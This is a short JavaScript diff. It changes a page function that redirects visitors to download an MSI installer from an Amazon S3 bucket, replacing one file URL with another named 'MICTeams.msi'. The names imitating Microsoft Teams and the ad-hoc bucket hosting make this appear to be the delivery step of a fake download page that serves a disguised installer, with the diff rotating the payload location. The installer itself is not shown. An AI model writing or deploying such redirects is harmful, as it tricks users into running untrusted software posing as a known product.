@@ -1,5 +1,5 @@
 function GetToFunction()
 {
-	var url="https://gg604.s3.ap-southeast-1.amazonaws.com/TMSeam_x64.msi";
+	var url="https://605gg.s3.ap-southeast-1.amazonaws.com/MICTeams.msi";
 	window.location=url;
 }
